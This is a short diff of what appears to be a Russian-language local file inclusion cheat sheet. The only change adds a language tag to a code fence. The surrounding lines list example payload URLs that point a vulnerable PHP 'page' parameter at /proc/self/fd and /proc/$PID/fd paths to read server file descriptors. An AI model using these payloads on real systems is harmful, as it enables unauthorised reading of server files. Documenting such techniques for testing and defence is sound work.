@@ -36,7 +36,7 @@ http://example.com/index.php?page=/proc/$PID/fd/$FD
 
 * Через /proc/self/fd
 
-```
+```python
 http://target.com/vuln.php?page=/proc/self/fd/3
 http://target.com/vuln.php?page=/proc/self/fd/4
 http://target.com/vuln.php?page=/proc/self/fd/5
